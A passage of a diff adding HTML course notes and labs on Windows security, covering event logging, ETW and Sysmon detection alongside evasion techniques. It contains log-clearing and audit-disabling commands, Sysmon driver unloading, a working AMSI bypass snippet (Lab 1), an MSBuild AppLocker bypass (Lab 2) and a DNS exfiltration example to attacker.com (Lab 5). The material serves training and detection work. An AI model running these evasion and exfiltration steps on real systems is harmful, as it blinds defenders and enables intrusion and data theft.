+        <li><strong>ICMP tunneling:</strong> Embed data in ICMP echo requests (ping) — often not filtered</li>
+        <li><strong>Named pipe pivoting:</strong> Use SMB named pipes over port 445 (often open in domain environments)</li>
+        <li><strong>Reverse connections:</strong> Outbound connections are typically less restricted — use reverse shells instead of bind shells</li>
+      </ul>
+
+      <!-- ─────────────────────────────────────────────────────────────────
+           SECTION 6: EVENT LOGGING & ETW
+           ───────────────────────────────────────────────────────────────── -->
+      <h2>6. Event Logging &amp; ETW</h2>
+
+      <h3>6.1 Windows Event Log Architecture</h3>
+      <ul>
+        <li><strong>Channels:</strong> Log containers — Security, System, Application, + hundreds of operational/analytic logs</li>
+        <li><strong>Providers:</strong> Components that generate events (services, drivers, applications)</li>
+        <li><strong>Consumers:</strong> Tools that read events (Event Viewer, SIEM, PowerShell)</li>
+        <li><strong>Service:</strong> Windows Event Log service (<code>EventLog</code> / <code>wevtsvc.dll</code>)</li>
+        <li><strong>Storage:</strong> <code>C:\Windows\System32\winevt\Logs\*.evtx</code></li>
+      </ul>
+
+      <h3>6.2 Key Security Event IDs</h3>
+      <table class="table table-bordered table-dark">
+        <thead><tr><th>Event ID</th><th>Category</th><th>Description</th><th>Detection Value</th></tr></thead>
+        <tbody>
+          <tr><td>4624</td><td>Logon</td><td>Successful logon (includes logon type: 2=interactive, 3=network, 7=unlock, 10=RDP)</td><td>Track lateral movement</td></tr>
+          <tr><td>4625</td><td>Logon</td><td>Failed logon (includes failure reason, source IP)</td><td>Brute force detection</td></tr>
+          <tr><td>4634 / 4647</td><td>Logon</td><td>Logoff / User-initiated logoff</td><td>Session duration analysis</td></tr>
+          <tr><td>4648</td><td>Logon</td><td>Logon with explicit credentials (runas)</td><td>Credential reuse / pivoting</td></tr>
+          <tr><td>4672</td><td>Privilege</td><td>Special privileges assigned (admin logon)</td><td>Privilege escalation</td></tr>
+          <tr><td>4688</td><td>Process</td><td>New process created (includes command line if audit enabled)</td><td>Malware execution, LOLBins</td></tr>
+          <tr><td>4689</td><td>Process</td><td>Process exited</td><td>Short-lived processes (suspicious)</td></tr>
+          <tr><td>4720</td><td>Account Mgmt</td><td>User account created</td><td>Persistence via new accounts</td></tr>
+          <tr><td>4722</td><td>Account Mgmt</td><td>User account enabled</td><td>Dormant account activation</td></tr>
+          <tr><td>4724 / 4723</td><td>Account Mgmt</td><td>Password reset / change attempt</td><td>Account takeover</td></tr>
+          <tr><td>4728 / 4732 / 4756</td><td>Group Mgmt</td><td>Member added to security group (global/local/universal)</td><td>Privilege escalation</td></tr>
+          <tr><td>4768</td><td>Kerberos</td><td>TGT requested (AS-REQ)</td><td>Authentication monitoring</td></tr>
+          <tr><td>4769</td><td>Kerberos</td><td>Service ticket requested (TGS-REQ)</td><td>Kerberoasting detection</td></tr>
+          <tr><td>4771</td><td>Kerberos</td><td>Kerberos pre-auth failed</td><td>AS-REP roasting, password spray</td></tr>
+          <tr><td>5140</td><td>File Share</td><td>Network share accessed</td><td>Lateral movement via SMB</td></tr>
+          <tr><td>5145</td><td>File Share</td><td>Network share object access (file-level detail)</td><td>Data exfiltration</td></tr>
+          <tr><td>4697</td><td>Service</td><td>Service installed</td><td>Persistence mechanism</td></tr>
+          <tr><td>7045</td><td>System</td><td>New service installed (System log)</td><td>Persistence / privilege escalation</td></tr>
+          <tr><td>1102</td><td>Security</td><td>Audit log cleared</td><td>Anti-forensics indicator</td></tr>
+        </tbody>
+      </table>
+
+<pre><code class="language-powershell"># Query security events
+Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents 50 | 
+  Select-Object TimeCreated, @{N='User';E={$_.Properties[5].Value}}, @{N='LogonType';E={$_.Properties[8].Value}}, @{N='SourceIP';E={$_.Properties[18].Value}}
+
+# Find failed logons from specific source
+Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} | Where-Object { $_.Properties[19].Value -eq "10.10.10.5" }
+
+# Process creation with command line
+Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} -MaxEvents 100 | 
+  Select-Object TimeCreated, @{N='Process';E={$_.Properties[5].Value}}, @{N='CommandLine';E={$_.Properties[8].Value}}
+
+# Enable command line in process creation events (requires GPO or registry)
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1
+</code></pre>
+
+      <h3>6.3 ETW (Event Tracing for Windows)</h3>
+      <h4>Architecture</h4>
+      <ul>
+        <li><strong>Providers:</strong> Components that emit events (kernel, user-mode services, applications). Identified by GUID.</li>
+        <li><strong>Sessions (Controllers):</strong> Collect events from providers and write to buffers/files. Managed by <code>StartTrace()</code> / <code>ControlTrace()</code>.</li>
+        <li><strong>Consumers:</strong> Process/display events from sessions (ETW realtime, .etl files).</li>
+      </ul>
+<pre><code class="language-powershell"># List running ETW sessions
+logman query -ets
+
+# List all registered providers
+logman query providers
+
+# Key providers for security:
+# Microsoft-Windows-Kernel-Process       {22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}
+# Microsoft-Windows-Kernel-File          {EDD08927-9CC4-4E65-B970-C2560FB5C289}
+# Microsoft-Windows-Kernel-Network       {7DD42A49-5329-4832-8DFD-43D979153A88}
+# Microsoft-Windows-Threat-Intelligence  {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}
+# Microsoft-Windows-DNS-Client           {1C95126E-7EEA-49A9-A3FE-A378B03DDB4D}
+
+# Start an ETW session
+logman create trace "MyTrace" -p "Microsoft-Windows-Kernel-Process" -ets
+logman stop "MyTrace" -ets
+</code></pre>
+
+      <h4>ETW Threat Intelligence Provider</h4>
+      <p>The <code>Microsoft-Windows-Threat-Intelligence</code> provider is a kernel-mode ETW provider that emits events for:</p>
+      <ul>
+        <li>Virtual memory allocation (RWX pages) — detects shellcode injection</li>
+        <li>Memory protection changes (<code>VirtualProtect</code> to executable)</li>
+        <li>Process hollowing / module stomping patterns</li>
+        <li>Map view of sections with execute permission</li>
+      </ul>
+      <p><strong>Note:</strong> Only PPL (Protected Process Light) processes can consume events from this provider — this is how Defender/EDR gets privileged telemetry.</p>
+
+      <h3>6.4 Log Evasion Techniques</h3>
+
+      <h4>Clearing Event Logs</h4>
+<pre><code class="language-powershell"># Clear specific log (generates Event 1102 in Security log)
+wevtutil cl Security
+Clear-EventLog -LogName Security
+
+# Clear all logs
+Get-WinEvent -ListLog * | ForEach-Object { wevtutil cl $_.LogName 2>$null }
+</code></pre>
+
+      <h4>Disabling Event Logging</h4>
+<pre><code class="language-powershell"># Stop the EventLog service (requires SYSTEM or high-priv)
+# Note: Stopping the service is logged and very noisy
+sc stop EventLog
+
+# Disable audit policies
+auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable
+auditpol /set /category:"Account Logon" /success:disable /failure:disable
+
+# Disable specific subcategory
+auditpol /set /subcategory:"Process Creation" /success:disable
+</code></pre>
+
+      <h4>ETW Patching (In-Memory)</h4>
+      <p>Patch <code>ntdll!EtwEventWrite</code> or <code>ntdll!NtTraceEvent</code> in the target process to disable ETW event emission:</p>
+<pre><code class="language-powershell"># Concept: Patch EtwEventWrite to return immediately (ret 0)
+# Similar approach to AMSI bypass — VirtualProtect + write patch bytes
+# This blinds any ETW consumer tracing that process
+
+# User-mode patch kills user-mode ETW only
+# Kernel ETW providers (TI provider) cannot be patched this way
+</code></pre>
+
+      <h4>Phantom Event Log (Thread Killing)</h4>
+      <p>The Event Log service (<code>svchost.exe -k LocalServiceNetworkRestricted -p -s EventLog</code>) uses multiple threads for logging. Kill logging threads without killing the service:</p>
+      <ol>
+        <li>Identify the Event Log service process and its threads</li>
+        <li>Enumerate threads responsible for writing events</li>
+        <li>Suspend/terminate those threads — service appears running but no events are written</li>
+        <li>Events generated during this window are permanently lost</li>
+      </ol>
+
+      <h3>6.5 Windows Event Forwarding (WEF)</h3>
+<pre><code class="language-powershell"># Configure WEF collector
+wecutil qc  # Quick config (enables WinRM, sets up collector)
+
+# Create subscription
+wecutil cs subscription.xml
+
+# Configure source computers (GPO):
+# Computer Configuration > Admin Templates > Windows Components > Event Forwarding
+# Configure target Subscription Manager: Server=http://collector.corp.local:5985/wsman/SubscriptionManager/WEC
+
+# Verify subscriptions
+wecutil gs "SecurityEvents"
+wecutil gr "SecurityEvents"  # Get runtime status
+</code></pre>
+
+      <!-- ─────────────────────────────────────────────────────────────────
+           SECTION 7: SYSMON
+           ───────────────────────────────────────────────────────────────── -->
+      <h2>7. Sysmon (System Monitor)</h2>
+
+      <h3>7.1 Key Event IDs</h3>
+      <table class="table table-bordered table-dark">
+        <thead><tr><th>ID</th><th>Event</th><th>Detection Use</th></tr></thead>
+        <tbody>
+          <tr><td>1</td><td>Process Create</td><td>Full command line, parent process, hashes — malware execution, LOLBins</td></tr>
+          <tr><td>2</td><td>File Creation Time Changed</td><td>Timestomping detection</td></tr>
+          <tr><td>3</td><td>Network Connection</td><td>Process network activity — C2 beacons, data exfil</td></tr>
+          <tr><td>5</td><td>Process Terminated</td><td>Short-lived malicious processes</td></tr>
+          <tr><td>6</td><td>Driver Loaded</td><td>Rootkit / vulnerable driver detection</td></tr>
+          <tr><td>7</td><td>Image Loaded (DLL)</td><td>DLL injection, side-loading, hijacking</td></tr>
+          <tr><td>8</td><td>CreateRemoteThread</td><td>Process injection (classic technique)</td></tr>
+          <tr><td>9</td><td>RawAccessRead</td><td>Direct disk access (credential dumping, MBR modification)</td></tr>
+          <tr><td>10</td><td>Process Access</td><td>LSASS access (mimikatz), process manipulation</td></tr>
+          <tr><td>11</td><td>File Create</td><td>Dropped files, payload staging</td></tr>
+          <tr><td>12</td><td>Registry Object Create/Delete</td><td>Persistence mechanisms</td></tr>
+          <tr><td>13</td><td>Registry Value Set</td><td>Run keys, service registration</td></tr>
+          <tr><td>14</td><td>Registry Object Renamed</td><td>Evasion via registry manipulation</td></tr>
+          <tr><td>15</td><td>File Create Stream Hash</td><td>ADS creation, downloaded file tracking (Zone.Identifier)</td></tr>
+          <tr><td>17/18</td><td>Pipe Created/Connected</td><td>Named pipe impersonation, C2 communication</td></tr>
+          <tr><td>19/20/21</td><td>WMI Event</td><td>WMI persistence detection</td></tr>
+          <tr><td>22</td><td>DNS Query</td><td>DNS-based C2, data exfiltration via DNS</td></tr>
+          <tr><td>23</td><td>File Delete (archived)</td><td>Deleted files with content preserved</td></tr>
+          <tr><td>25</td><td>Process Tampering</td><td>Process hollowing, herpaderping, ghosting detection</td></tr>
+          <tr><td>26</td><td>File Delete Logged</td><td>File deletion tracking (no archive)</td></tr>
+          <tr><td>28</td><td>File Block Shredding</td><td>Anti-forensics detection</td></tr>
+        </tbody>
+      </table>
+
+      <h3>7.2 Sysmon Configuration</h3>
+<pre><code class="language-powershell"># Install Sysmon with configuration
+sysmon64.exe -accepteula -i sysmonconfig.xml
+
+# Update configuration
+sysmon64.exe -c sysmonconfig.xml
+
+# View current configuration
+sysmon64.exe -c
+
+# Uninstall
+sysmon64.exe -u
+
+# Popular configs:
+# SwiftOnSecurity: https://github.com/SwiftOnSecurity/sysmon-config
+# Olaf Hartong modular: https://github.com/olafhartong/sysmon-modular
+# Ion Storm: https://github.com/ion-storm/sysmon-config
+</code></pre>
+
+      <h4>Example Config Snippet — Detect LSASS Access</h4>
+<pre><code class="language-bash">&lt;!-- Sysmon config XML --&gt;
+&lt;Sysmon schemaversion="4.90"&gt;
+  &lt;EventFiltering&gt;
+    &lt;!-- Event ID 10: Process Access --&gt;
+    &lt;ProcessAccess onmatch="include"&gt;
+      &lt;TargetImage condition="is"&gt;C:\Windows\System32\lsass.exe&lt;/TargetImage&gt;
+    &lt;/ProcessAccess&gt;
+    
+    &lt;!-- Event ID 1: Process Creation (suspicious parents) --&gt;
+    &lt;ProcessCreate onmatch="include"&gt;
+      &lt;ParentImage condition="is"&gt;C:\Windows\System32\cmd.exe&lt;/ParentImage&gt;
+      &lt;ParentImage condition="is"&gt;C:\Windows\System32\wscript.exe&lt;/ParentImage&gt;
+      &lt;ParentImage condition="is"&gt;C:\Windows\System32\mshta.exe&lt;/ParentImage&gt;
+    &lt;/ProcessCreate&gt;
+    
+    &lt;!-- Event ID 8: CreateRemoteThread --&gt;
+    &lt;CreateRemoteThread onmatch="exclude"&gt;
+      &lt;SourceImage condition="is"&gt;C:\Windows\System32\csrss.exe&lt;/SourceImage&gt;
+    &lt;/CreateRemoteThread&gt;
+  &lt;/EventFiltering&gt;
+&lt;/Sysmon&gt;
+</code></pre>
+
+      <h3>7.3 Detection Engineering with Sysmon</h3>
+      <table class="table table-bordered table-dark">
+        <thead><tr><th>Attack</th><th>Sysmon Event</th><th>Detection Logic</th></tr></thead>
+        <tbody>
+          <tr><td>Mimikatz / credential dump</td><td>Event 10</td><td>TargetImage=lsass.exe, GrantedAccess includes 0x1010 or 0x1038</td></tr>
+          <tr><td>Process injection</td><td>Event 8</td><td>CreateRemoteThread from non-system process</td></tr>
+          <tr><td>DLL sideloading</td><td>Event 7</td><td>Unsigned DLL loaded from non-standard path by signed binary</td></tr>
+          <tr><td>WMI persistence</td><td>Event 19/20/21</td><td>WMI event subscription creation</td></tr>
+          <tr><td>DNS C2</td><td>Event 22</td><td>High-entropy subdomain queries, high volume to single domain</td></tr>
+          <tr><td>Process hollowing</td><td>Event 25</td><td>ProcessTampering with Type=Image is replaced</td></tr>
+          <tr><td>Scheduled task persistence</td><td>Event 1</td><td>schtasks.exe with /create and suspicious command</td></tr>
+        </tbody>
+      </table>
+
+      <h3>7.4 Sysmon Evasion</h3>
+
+      <h4>Driver Unload</h4>
+<pre><code class="language-powershell"># Unload Sysmon driver (requires admin + knowledge of driver name)
+# Default driver name: SysmonDrv (can be renamed during install with -d flag)
+fltmc unload SysmonDrv
+
+# Check loaded minifilter drivers
+fltmc
+</code></pre>
+
+      <h4>Minifilter Altitude Manipulation</h4>
+      <p>Sysmon registers as a minifilter driver at a specific altitude (385201 by default). Attackers can:</p>
+      <ul>
+        <li>Register a higher-altitude minifilter that intercepts and blocks events before Sysmon sees them</li>
+        <li>Modify the Sysmon minifilter's altitude in registry to a lower value (less visibility)</li>
+      </ul>
+<pre><code class="language-powershell"># View minifilter altitudes
+fltmc instances
+
+# Registry location for minifilter altitude:
+# HKLM\SYSTEM\CurrentControlSet\Services\SysmonDrv\Instances\Sysmon Instance\Altitude
+</code></pre>
+
+      <h4>Event Log Channel Disruption</h4>
+<pre><code class="language-powershell"># Sysmon logs to: Microsoft-Windows-Sysmon/Operational
+# Disable the log channel
+wevtutil sl Microsoft-Windows-Sysmon/Operational /e:false
+
+# Or reduce max log size to force rapid rollover
+wevtutil sl Microsoft-Windows-Sysmon/Operational /ms:1048576  # 1MB
+</code></pre>
+
+      <h4>Config-Aware Evasion</h4>
+      <p>If the attacker can read the Sysmon config (stored in registry), they can craft activity that falls in exclusion rules:</p>
+<pre><code class="language-powershell"># Dump Sysmon config from registry
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\SysmonDrv\Parameters" /v Rules
+
+# Or extract config in XML
+sysmon -c  # Requires running as admin
+</code></pre>
+
+    </div><!-- end notes tab -->
+
+    <!-- ═══════════════════════════════════════════════════════════════════
+         LABS TAB
+         ═══════════════════════════════════════════════════════════════════ -->
+    <div class="tab-pane fade" id="lab" role="tabpanel">
+
+      <h2>Labs</h2>
+
+      <!-- LAB 1 -->
+      <div class="lab-card">
+        <h3>Lab 1: AMSI Bypass — Patching AmsiScanBuffer</h3>
+        <p><strong>Objective:</strong> Demonstrate the classic AMSI bypass by patching AmsiScanBuffer in a PowerShell process to execute detected strings without triggering Defender.</p>
+        <h4>Setup</h4>
+        <ul>
+          <li>Windows 10/11 VM with Defender enabled (real-time protection ON)</li>
+          <li>PowerShell 5.1 or 7.x</li>
+          <li>Tamper Protection OFF for lab purposes</li>
+        </ul>
+        <h4>Steps</h4>
+        <ol>
+          <li>Open PowerShell and verify AMSI is active:
+<pre><code class="language-powershell"># This should trigger AMSI detection
+"Invoke-Mimikatz"
+# Expected: "This script contains malicious content and has been blocked"
+</code></pre>
+          </li>
+          <li>Apply the AmsiScanBuffer patch:
+<pre><code class="language-powershell">$a=[Ref].Assembly.GetTypes()
+$b=$a | ForEach-Object { if ($_.Name -like "*iUtils") { $_ } }
+$c=$b.GetFields('NonPublic,Static') | Where-Object { $_.Name -like "*Context" }
+[IntPtr]$ptr=$c.GetValue($null)
+[Int32[]]$buf=@(0)
+[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
+</code></pre>
+          </li>
+          <li>Verify AMSI is bypassed:
+<pre><code class="language-powershell"># This should now execute without detection
+"Invoke-Mimikatz"
+# Expected: String output without blocking
+</code></pre>
+          </li>
+          <li>Verify the bypass only affects the current process — open a new PowerShell window and confirm AMSI still works there.</li>
+        </ol>
+        <h4>Analysis Questions</h4>
+        <ul>
+          <li>Why does this bypass only work in the current process?</li>
+          <li>What event IDs would detect this behavior in a production environment?</li>
+          <li>How would you detect this bypass with ETW or Sysmon?</li>
+        </ul>
+      </div>
+
+      <!-- LAB 2 -->
+      <div class="lab-card">
+        <h3>Lab 2: AppLocker Policy Enumeration &amp; Bypass via MSBuild</h3>
+        <p><strong>Objective:</strong> Deploy AppLocker in audit mode, identify rules, and bypass executable restrictions using MSBuild.exe.</p>
+        <h4>Setup</h4>
+        <ul>
+          <li>Windows 10/11 Pro or Enterprise (AppLocker requires Enterprise for enforcement)</li>
+          <li>Configure AppLocker via Local Security Policy (secpol.msc)</li>
+        </ul>
+        <h4>Steps</h4>
+        <ol>
+          <li>Configure AppLocker with default rules + block all executables from user-writable paths:
+<pre><code class="language-powershell"># Enable AppLocker service
+Set-Service -Name AppIDSvc -StartupType Automatic
+Start-Service AppIDSvc
+
+# Create default rules via GPO/secpol.msc or PowerShell
+# Block executing from C:\Users\*
+</code></pre>
+          </li>
+          <li>Verify AppLocker blocks a test executable:
+<pre><code class="language-powershell"># Copy calc to user directory and attempt execution
+copy C:\Windows\System32\calc.exe C:\Users\Public\calc.exe
+C:\Users\Public\calc.exe
+# Expected: Blocked by AppLocker
+</code></pre>
+          </li>
+          <li>Create an MSBuild payload:
+<pre><code class="language-bash">&lt;!-- Save as C:\Users\Public\payload.csproj --&gt;
+&lt;Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"&gt;
+  &lt;Target Name="Exec"&gt;
+    &lt;Exec Command="whoami /all" /&gt;
+  &lt;/Target&gt;
+&lt;/Project&gt;
+</code></pre>
+          </li>
+          <li>Execute via MSBuild (bypasses AppLocker since MSBuild.exe is in C:\Windows\):
+<pre><code class="language-powershell">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Users\Public\payload.csproj
+# Expected: Executes successfully — whoami output displayed
+</code></pre>
+          </li>
+          <li>Check AppLocker event logs:
+<pre><code class="language-powershell">Get-WinEvent -LogName "Microsoft-Windows-AppLocker/EXE and DLL" -MaxEvents 20 | Format-Table TimeCreated, Id, Message -Wrap
+</code></pre>
+          </li>
+        </ol>
+      </div>
+
+      <!-- LAB 3 -->
+      <div class="lab-card">
+        <h3>Lab 3: WDAC Policy Creation &amp; Testing</h3>
+        <p><strong>Objective:</strong> Create a WDAC policy that allows only Microsoft-signed binaries, deploy in audit mode, then test enforcement.</p>
+        <h4>Steps</h4>
+        <ol>
+          <li>Create baseline policy:
+<pre><code class="language-powershell"># Create policy allowing only Microsoft-signed binaries
+New-CIPolicy -Level Publisher -FilePath "C:\Policies\MicrosoftOnly.xml" -UserPEs -Fallback Hash
+
+# Set audit mode
+Set-RuleOption -FilePath "C:\Policies\MicrosoftOnly.xml" -Option 3
+</code></pre>
+          </li>
+          <li>Convert and deploy:
+<pre><code class="language-powershell"># Convert to binary
+ConvertFrom-CIPolicy "C:\Policies\MicrosoftOnly.xml" "C:\Windows\System32\CodeIntegrity\SIPolicy.p7b"
+
+# Reboot for policy to take effect
+Restart-Computer
+</code></pre>
+          </li>
+          <li>After reboot, run unsigned binaries and check Code Integrity events:
+<pre><code class="language-powershell"># Check for WDAC audit events
+Get-WinEvent -LogName "Microsoft-Windows-CodeIntegrity/Operational" | 
+  Where-Object { $_.Id -in @(3076, 3077) } | 
+  Select-Object TimeCreated, Id, Message | Format-Table -Wrap
+# 3076 = Audit mode block, 3077 = Enforcement mode block
+</code></pre>
+          </li>
+          <li>Switch to enforcement and verify unsigned binaries are blocked:
+<pre><code class="language-powershell"># Remove audit mode option
+Set-RuleOption -FilePath "C:\Policies\MicrosoftOnly.xml" -Option 3 -Delete
+ConvertFrom-CIPolicy "C:\Policies\MicrosoftOnly.xml" "C:\Windows\System32\CodeIntegrity\SIPolicy.p7b"
+Restart-Computer
+</code></pre>
+          </li>
+        </ol>
+      </div>
+
+      <!-- LAB 4 -->
+      <div class="lab-card">
+        <h3>Lab 4: BitLocker TPM-Only Mode &amp; Recovery Key Extraction</h3>
+        <p><strong>Objective:</strong> Configure BitLocker with TPM-only mode and practice recovery key extraction from AD.</p>
+        <h4>Steps</h4>
+        <ol>
+          <li>Enable BitLocker on a test VM with virtual TPM:
+<pre><code class="language-powershell"># Check TPM status
+Get-Tpm
+
+# Enable BitLocker with TPM-only
+Enable-BitLocker -MountPoint "C:" -EncryptionMethod XtsAes256 -TpmProtector -SkipHardwareTest
+
+# Add recovery password protector
+Add-BitLockerKeyProtector -MountPoint "C:" -RecoveryPasswordProtector
+</code></pre>
+          </li>
+          <li>Retrieve and document recovery information:
+<pre><code class="language-powershell"># Get all protectors
+(Get-BitLockerVolume -MountPoint C:).KeyProtector
+
+# Backup to AD (domain-joined machine)
+Backup-BitLockerKeyProtector -MountPoint "C:" -KeyProtectorId (Get-BitLockerVolume -MountPoint C:).KeyProtector[1].KeyProtectorId
+</code></pre>
+          </li>
+          <li>Simulate recovery scenario — suspend BitLocker and trigger recovery:
+<pre><code class="language-powershell"># Suspend for one reboot (simulates firmware update)
+Suspend-BitLocker -MountPoint "C:" -RebootCount 1
+
+# Force recovery prompt (add a bogus PCR policy)
+# Or manually invoke: manage-bde -forcerecovery C:
+</code></pre>
+          </li>
+          <li>Practice AD recovery key lookup:
+<pre><code class="language-powershell"># From domain controller or authorized workstation
+Get-ADObject -Filter {objectclass -eq 'msFVE-RecoveryInformation'} -SearchBase "DC=corp,DC=local" -Properties msFVE-RecoveryPassword | Select-Object DistinguishedName, msFVE-RecoveryPassword
+</code></pre>
+          </li>
+        </ol>
+      </div>
+
+      <!-- LAB 5 -->
+      <div class="lab-card">
+        <h3>Lab 5: Windows Firewall Rule Analysis &amp; Bypass</h3>
+        <p><strong>Objective:</strong> Enumerate firewall rules, identify weaknesses, and demonstrate bypass via process injection into an allowed application.</p>
+        <h4>Steps</h4>
+        <ol>
+          <li>Configure restrictive outbound firewall (block all, allow specific):
+<pre><code class="language-powershell"># Set default outbound to block
+Set-NetFirewallProfile -Profile Domain,Private,Public -DefaultOutboundAction Block
+
+# Allow only specific programs
+New-NetFirewallRule -DisplayName "Allow Chrome" -Direction Outbound -Program "C:\Program Files\Google\Chrome\Application\chrome.exe" -Action Allow
+New-NetFirewallRule -DisplayName "Allow DNS" -Direction Outbound -Protocol UDP -RemotePort 53 -Action Allow
+New-NetFirewallRule -DisplayName "Allow HTTPS" -Direction Outbound -Protocol TCP -RemotePort 443 -Program "C:\Windows\System32\svchost.exe" -Action Allow
+</code></pre>
+          </li>
+          <li>Verify a test tool (e.g., curl, PowerShell) is blocked outbound:
+<pre><code class="language-powershell"># This should fail
+Invoke-WebRequest "http://example.com" -TimeoutSec 5
+# Expected: Connection timed out / blocked
+</code></pre>
+          </li>
+          <li>Enumerate all allowed outbound applications:
+<pre><code class="language-powershell">Get-NetFirewallRule -Direction Outbound -Action Allow -Enabled True | 
+  Get-NetFirewallApplicationFilter | 
+  Where-Object { $_.Program -ne "Any" } | 
+  Select-Object Program | Sort-Object -Unique
+</code></pre>
+          </li>
+          <li>Demonstrate DNS tunneling bypass (port 53 is allowed):
+<pre><code class="language-powershell"># Concept: Use DNS queries to exfiltrate data
+# Encode data in subdomain: [base64-data].attacker.com
+# Tools: dnscat2, iodine, dns2tcp
+nslookup dGVzdGRhdGE.attacker.com
+</code></pre>
+          </li>
+        </ol>
+      </div>
+
+      <!-- LAB 6 -->
+      <div class="lab-card">
+        <h3>Lab 6: Security Event Log Analysis — Detecting Lateral Movement</h3>
+        <p><strong>Objective:</strong> Generate and analyze event logs to identify lateral movement patterns (pass-the-hash, RDP, PSRemoting).</p>
+        <h4>Steps</h4>
+        <ol>
+          <li>Enable advanced audit policies:
+<pre><code class="language-powershell"># Enable all relevant audit subcategories
+auditpol /set /subcategory:"Logon" /success:enable /failure:enable
+auditpol /set /subcategory:"Logoff" /success:enable
+auditpol /set /subcategory:"Special Logon" /success:enable
+auditpol /set /subcategory:"Other Logon/Logoff Events" /success:enable /failure:enable
+auditpol /set /subcategory:"Process Creation" /success:enable
+auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
+auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
+</code></pre>
+          </li>
+          <li>Simulate lateral movement via PsExec (generates Type 3 logon + service install):
+<pre><code class="language-powershell"># From attacker machine
+PsExec.exe \\target -u admin -p password cmd.exe
+</code></pre>
+          </li>
+          <li>Analyze resulting events:
+<pre><code class="language-powershell"># Find network logons (Type 3) from specific source
+Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} | 
+  Where-Object { $_.Properties[8].Value -eq 3 } |
+  Select-Object TimeCreated, @{N='User';E={$_.Properties[5].Value}}, @{N='Source';E={$_.Properties[18].Value}} |
+  Format-Table
+
+# Find new service installations (PsExec creates PSEXESVC)
+Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} | 
+  Where-Object { $_.Message -match "PSEXE" } |
+  Select-Object TimeCreated, Message
+</code></pre>
+          </li>
+          <li>Build correlation: 4624 (Type 3) → 4672 (special privileges) → 7045 (service install) → 4688 (cmd.exe spawned)</li>
+        </ol>
+      </div>
+
+      <!-- LAB 7 -->
+      <div class="lab-card">
+        <h3>Lab 7: ETW Tracing — Monitoring Process Injection</h3>
+        <p><strong>Objective:</strong> Set up ETW consumers to detect process injection in real-time using the Kernel-Process provider.</p>
+        <h4>Steps</h4>
+        <ol>
+          <li>Start an ETW trace session for process and memory events:
+<pre><code class="language-powershell"># Create real-time ETW session
+logman create trace "InjectionMonitor" -p "Microsoft-Windows-Kernel-Process" 0x10 -ets
+logman create trace "MemoryMonitor" -p "Microsoft-Windows-Kernel-Memory" -ets
+
+# Start consuming with tracerpt or custom consumer
+logman update trace "InjectionMonitor" -p "Microsoft-Windows-Kernel-Audit-API-Calls" -ets
+</code></pre>
+          </li>
+          <li>In a second terminal, perform process injection (e.g., CreateRemoteThread into notepad):
+<pre><code class="language-powershell"># Use a simple injector tool or PowerShell to:
+# 1. Open target process (notepad.exe)
+# 2. VirtualAllocEx with RWX
+# 3. WriteProcessMemory (shellcode)
+# 4. CreateRemoteThread
+</code></pre>
+          </li>
+          <li>Analyze the ETW trace data:
+<pre><code class="language-powershell"># Stop and analyze
+logman stop "InjectionMonitor" -ets
+tracerpt "InjectionMonitor.etl" -o injection_report.evtx -of EVTX
+
+# Look for:
+# - VirtualAlloc with PAGE_EXECUTE_READWRITE (0x40)
+# - Cross-process memory writes
+# - Remote thread creation
+</code></pre>
+          </li>
+        </ol>
+      </div>
+
+      <!-- LAB 8 -->
+      <div class="lab-card">
+        <h3>Lab 8: Sysmon Deployment &amp; Rule Tuning</h3>
+        <p><strong>Objective:</strong> Deploy Sysmon with a custom configuration, generate test events, and tune rules to reduce noise while maintaining detection coverage.</p>
+        <h4>Steps</h4>
+        <ol>
+          <li>Install Sysmon with SwiftOnSecurity config:
+<pre><code class="language-powershell"># Download Sysmon
+Invoke-WebRequest "https://live.sysinternals.com/Sysmon64.exe" -OutFile "C:\Tools\Sysmon64.exe"
+
+# Download SwiftOnSecurity config
+Invoke-WebRequest "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" -OutFile "C:\Tools\sysmonconfig.xml"
+
+# Install
+C:\Tools\Sysmon64.exe -accepteula -i C:\Tools\sysmonconfig.xml
+</code></pre>
+          </li>
+          <li>Generate test events:
+<pre><code class="language-powershell"># Process creation (Event 1)
+cmd.exe /c whoami
+
+# Network connection (Event 3)
+Invoke-WebRequest "http://example.com"
+
+# Registry modification (Event 13)
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TestPersistence" /d "calc.exe"
+
+# File creation (Event 11)
+echo "test" > C:\Users\Public\testfile.txt
+</code></pre>
+          </li>
+          <li>Query and analyze Sysmon events:
+<pre><code class="language-powershell"># View recent Sysmon events
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 50 | 
+  Select-Object Id, TimeCreated, Message | Format-Table -Wrap
+
+# Filter for specific event type
+Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-Sysmon/Operational"; Id=1} -MaxEvents 20 |
+  ForEach-Object { [xml]$xml = $_.ToXml(); $xml.Event.EventData.Data | Where-Object { $_.Name -in @('Image','CommandLine','ParentImage') } }
+</code></pre>
+          </li>
+          <li>Identify noisy events and add exclusions:
+<pre><code class="language-bash">&lt;!-- Add exclusion for noisy process --&gt;
+&lt;ProcessCreate onmatch="exclude"&gt;
+  &lt;Image condition="is"&gt;C:\Windows\System32\conhost.exe&lt;/Image&gt;
+  &lt;Image condition="is"&gt;C:\Windows\System32\backgroundTaskHost.exe&lt;/Image&gt;
+&lt;/ProcessCreate&gt;
+</code></pre>
+          </li>
+        </ol>
+      </div>
+
+      <!-- LAB 9 -->
+      <div class="lab-card">
